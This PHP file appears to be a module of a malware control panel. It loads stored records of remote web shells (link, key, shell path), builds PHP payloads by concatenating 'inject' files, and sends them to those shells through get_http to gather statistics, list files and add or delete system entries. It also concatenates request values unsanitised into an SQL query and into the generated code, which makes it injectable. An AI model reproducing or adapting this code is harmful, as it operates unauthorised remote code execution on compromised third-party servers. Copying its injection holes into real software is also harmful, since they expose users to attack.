<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){
		$get_php = '$cur_file = \''.$result->shell.'\';';
		if(!empty($Cur['z'])) $get_php .= '$dest = true;';
		$get_php .= file_get_contents('modules/admins/injects/start.php');
		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
		$get_php .= file_get_contents('modules/admins/injects/shever_stat.php');
		$stat = get_http($result->link, $get_php, $result->keyid, $result->shell);
        $smarty->assign('stat', $stat);

		$get_php = '$cur_file = \''.$result->shell.'\';';
		if(!empty($Cur['x'])) $get_php .= '$delete_sys = \''.$Cur['x'].'\';';
		if(!empty($Cur['y']) && !empty($Cur['z'])) $get_php .= '$add_sys = \''.strtoupper($Cur['y']).':'.$Cur['z'].'\';';
		$get_php .= file_get_contents('modules/admins/injects/start.php');
		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
		$get_php .= file_get_contents('modules/admins/injects/cmd_shever.php');
		$list = get_http($result->link, $get_php, $result->keyid, $result->shell);
		$list = explode('[~]', $list);
		$smarty->assign('admin', $result);
		$smarty->assign('list', json_decode($list[0]));
		$smarty->assign('files', explode('|', $list[1]));
	}
}

?>